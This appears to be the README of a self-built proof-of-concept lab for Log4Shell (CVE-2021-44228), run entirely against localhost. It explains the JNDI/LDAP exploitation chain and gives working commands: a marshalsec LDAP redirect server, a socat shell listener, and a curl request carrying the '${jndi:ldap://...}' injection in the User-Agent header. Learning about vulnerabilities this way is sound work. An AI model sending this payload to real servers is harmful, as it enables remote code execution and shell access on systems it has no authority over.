# Introduction

I wanted to learn more about the internals of CVE-2021-44228 and see it in action, so I put together a basic PoC that simulates it; maybe someone else is interested in playing around with it.

A lot has been researched and written about this vulnerability already, but a basic breakdown of how this PoC works:

- log4j interprets strings instead of just writing them to a logfile
- it even allows for retrieving external Java objects through LDAP and other protocols
- a malicious Java object can easily be written to execute arbitrary code on the application server
- if the application runs as root, super user privileges are instantly obtained

For this PoC, the com.sun.jndi.ldap.object.trustURLCodebase was set to true. For a long time now, this is set to false by default, which at least mitigates what I did here. There are many ways to work around this mitigation, however, like using gadgets (known classes that are trusted by default), etc. In addition, there are other methods that can be used (RMI, DNS, etc.).

Maybe I'll try out some of the other ones in the future :)

# Infrastructure

## The vulnerable webserver

It's been many years since I touched Java, so for the webserver I used a basic Undertow sample and extended it with a vulnerable log4j version (2.14.1) to log the User-Agent of incoming requests (a common scenario IRL).

The webserver runs on port 1337.

You can build and run the webserver manually, or by using the build-and-run-webserver.sh included in the folder.

## LDAP server

For the LDAP lookup, we need an LDAP server. The JNDI query we inject is actually the URL of this LDAP server. It is attacker controlled, so not a requirement on the victim side.

There are various out of the box LDAP servers/redirects that we can use for this purpose, one of them being part of marshalsec, found here: https://github.com/mbechler/marshalsec

You need to clone and build this yourself:

```
# Clone the repo
git clone https://github.com/mbechler/marshalsec.git

# Build it
cd marshalsec
mvn clean package -DskipTests

# Run it
java -cp target/marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.LDAPRefServer "http://127.0.0.1:8888/#Exploit"
```

The URL supplied at the end, is yet another (attacker controlled) webserver that hosts the exploit itself, see the next section.

## The exploit itself

In the JNDI framework, an ObjectFactory plays a crucial role: it allows for dynamic creation of objects, even remote ones.

In our Exploit.java, we implement the ObjectFactory interface and our malicious code is part of the getObjectInstance override.

The exploit can be built and hosted using the supplied build-and-host-exploit.sh, this will start a simple Python webserver on port 8888: the URL supplied when you started the LDAP server.

# Exploitation

Once the infrastructure is running, doing the actual exploitation is trivial:

Run a shell listener:

```bash

socat -d -d TCP4-LISTEN:4444 STDOUT

```

Then, from a different shell, send a request to the vulnerable webserver:

```bash

curl -H 'User-Agent: ${jndi:ldap://127.0.0.1:1389/Exploit}' http://localhost:1337

```

As you can see, we perform a very basic GET request against our webserver, but in our User-Agent header, we supply a JNDI query with the URL of the LDAP server we started, to which log4j will send its lookup request. The LDAP server redirects the request to our Python webserver on port 8888, which serves the Exploit.class file back to the vulnerable webserver, which in turn instantiates the class it receives, executing our payload to drop a shell.